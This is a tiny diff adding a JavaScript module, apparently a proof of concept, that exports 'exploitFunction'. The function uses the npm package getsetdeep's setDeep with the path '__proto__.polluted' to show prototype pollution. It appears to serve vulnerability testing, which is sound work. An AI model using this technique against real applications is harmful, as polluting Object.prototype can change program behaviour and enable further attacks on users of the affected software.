@@ -1,0 +1,6 @@
+function exploitFunction(obj) {
+    const pkg = require("getsetdeep");
+    pkg.setDeep(obj, "__proto__.polluted", "yes");
+}
+
+module.exports = { exploitFunction };
